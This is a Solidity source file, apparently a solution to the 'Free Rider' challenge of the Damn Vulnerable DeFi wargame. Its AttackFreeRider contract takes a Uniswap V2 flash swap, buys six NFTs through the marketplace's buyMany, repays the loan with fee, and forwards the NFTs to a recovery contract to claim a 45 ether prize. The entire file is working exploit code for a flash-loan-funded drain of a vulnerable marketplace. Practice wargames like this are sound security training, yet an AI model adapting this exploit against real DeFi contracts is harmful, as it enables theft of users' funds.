// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderRecovery.sol";
import "../DamnValuableNFT.sol";
import "hardhat/console.sol";

interface IUniswapV2Pair {
    function token0() external view returns (address);

    function token1() external view returns (address);

    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address dst, uint wad) external returns (bool);

    function balanceOf(address account) external returns (uint256);
}

interface IUniswapV2Factory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

interface WETH9 is IERC20 {
    function withdraw(uint wad) external;

    function deposit() external payable;
}

contract AttackFreeRider {
    IUniswapV2Pair uniswapPair;
    IUniswapV2Factory uniswapFactory;
    FreeRiderNFTMarketplace nftMarketplace;
    FreeRiderRecovery freeRiderRecovery;
    DamnValuableNFT nft;
    address player;
    uint256[] tokenIds;
    uint256 constant LOAN_AMOUNT = 15 ether;
    uint256 private constant PRIZE = 45 ether;
    uint256 constant FLASH_SWAP_FEE = ((LOAN_AMOUNT * 3) / 997) + 1;

    constructor(
        IUniswapV2Pair _uniswapPair,
        IUniswapV2Factory _uniswapFactory,
        FreeRiderNFTMarketplace _nftMarketplace,
        FreeRiderRecovery _freeRiderRecovery,
        DamnValuableNFT _nft,
        uint256[] memory _tokenIds,
        address _player
    ) payable {
        uniswapPair = _uniswapPair;
        uniswapFactory = _uniswapFactory;
        nftMarketplace = _nftMarketplace;
        freeRiderRecovery = _freeRiderRecovery;
        nft = _nft;
        tokenIds = _tokenIds;
        player = _player;
    }

    function attack() external {
        uniswapPair.swap(LOAN_AMOUNT, 0, address(this), "0x");
    }

    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external {
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();

        require(
            msg.sender ==
                IUniswapV2Factory(uniswapFactory).getPair(token0, token1),
            "Message sender is not a Uniswap V2 Pair"
        );

        require(
            IERC20(token0).balanceOf(address(this)) >= LOAN_AMOUNT,
            "Flash swap failed!"
        );

        WETH9(token0).withdraw(IERC20(token0).balanceOf(address(this)));

        nftMarketplace.buyMany{value: address(this).balance-FLASH_SWAP_FEE}(tokenIds);

        require(
            DamnValuableNFT(nftMarketplace.token()).balanceOf(address(this)) ==
                6,
            "Exploit failed!"
        );

        WETH9(token0).deposit{value: LOAN_AMOUNT + FLASH_SWAP_FEE}();
        WETH9(token0).transfer(address(uniswapPair), LOAN_AMOUNT + FLASH_SWAP_FEE);

        for (uint256 i = 0; i < tokenIds.length; i++) {
            nft.safeTransferFrom(address(this), address(freeRiderRecovery), i, abi.encode(player));
        }

        require(address(this).balance >= PRIZE, "Prize not received!");

    }

    receive() external payable {}

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
